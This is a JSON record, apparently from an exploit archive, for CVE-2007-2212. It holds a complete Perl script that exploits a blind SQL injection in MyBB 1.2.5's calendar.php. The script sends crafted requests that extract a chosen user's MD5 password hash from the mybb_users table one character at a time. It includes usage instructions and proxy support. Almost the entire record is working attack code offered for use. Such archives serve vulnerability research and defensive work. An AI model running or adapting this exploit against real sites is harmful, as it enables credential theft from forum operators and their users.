{
  "id": "3780",
  "title": "MyBulletinBoard (MyBB) 1.2.5 - &#039;calendar.php&#039; Blind SQL Injection",
  "cve": "CVE-2007-2212",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl\r\nuse LWP::UserAgent;\r\nuse Getopt::Long;\r\n\r\nif(!$ARGV[1])\r\n{\r\n  print \"                                                                \\n\";\r\n  print \"   #############################################################\\n\";\r\n  print \"   #   MyBulletinBoard <= 1.2.5 Remote SQL Injection Exploit   #\\n\";\r\n  print \"   #   Bug found and Exploit coded by 0x86                     #\\n\";\r\n  print \"   #                                                           #\\n\";\r\n  print \"   #   www.geeksec.net                                         #\\n\";\r\n  print \"   #   0x86 [at] geeksec.net                                   #\\n\";\r\n  print \"   #                                                           #\\n\";\r\n  print \"   #   Usage:   perl mybb.pl host path <options>               #\\n\";\r\n  print \"   #   Example: perl mybb.pl www.host.com /mybb/ -u 5          #\\n\";\r\n  print \"   #                                                           #\\n\";\r\n  print \"   #   Options:                                                #\\n\";\r\n  print \"   #     -u    User-ID, default: 1                             #\\n\";\r\n  print \"   #     -p    Proxy support                                   #\\n\";\r\n  print \"   #############################################################\\n\";\r\n  exit;\r\n}\r\n\r\nmy $host    = $ARGV[0];\r\nmy $path    = $ARGV[1];\r\nmy $userid  = 1;\r\nmy %options = ();\r\nGetOptions(\\%options, \"u=i\", \"p=s\");\r\n\r\nprint \"[+] Exploiting...\\n\";\r\n\r\nif($options{\"u\"})\r\n{\r\n  $userid = $options{\"u\"};\r\n}\r\n\r\nsyswrite(STDOUT, \"[+] MD5-Hash: \", 14);\r\n\r\nfor(my $i = 1; $i <= 32; $i++)\r\n{\r\n  my $f = 0;\r\n  my $h = 48;\r\n  while(!$f && $h <= 57)\r\n  {\r\n    if(istrue2($host, $path, $userid, $i, $h))\r\n    {\r\n      $f = 1;\r\n      syswrite(STDOUT, chr($h), 1);\r\n    }\r\n    $h++;\r\n  }\r\n  if(!$f)\r\n  {\r\n    $h = 97;\r\n    while(!$f && $h <= 122)\r\n    {\r\n      if(istrue2($host, $path, $userid, $i, $h))\r\n      {\r\n        $f = 1;\r\n        syswrite(STDOUT, chr($h), 1);\r\n      }\r\n      $h++;\r\n    }\r\n  }\r\n}\r\n\r\nprint \"\\n[+] Exploiting done\\n\";\r\n\r\nsub istrue2\r\n{\r\n  my $host  = shift;\r\n  my $path  = shift;\r\n  my $uid   = shift;\r\n  my $i     = shift;\r\n  my $h     = shift;\r\n \r\n  my $ua = LWP::UserAgent->new;\r\n  my $query = \"http://\".$host.$path.\"calendar.php?action=dayview&year=2007&month=3&day=1111111'%20OR%20SUBSTRING((SELECT%20password%20FROM%20mybb_users%20WHERE%20uid=\".$uid.\"),\".$i.\",1)=CHAR(\".$h.\")/*\";\r\n \r\n  if($options{\"p\"})\r\n  {\r\n    $ua->proxy('http', \"http://\".$options{\"p\"});\r\n  }\r\n \r\n  my $resp = $ua->get($query);\r\n  my $content = $resp->content;\r\n  my $regexp = \"profile\";\r\n \r\n  if($content =~ /$regexp/)\r\n  {\r\n    return 1;\r\n  }\r\n  else\r\n  {\r\n    return 0;\r\n  }\r\n\r\n}\r\n\r\n# milw0rm.com [2007-04-23]",
  "url": "https://www.exploit-db.com/exploits/3780"
}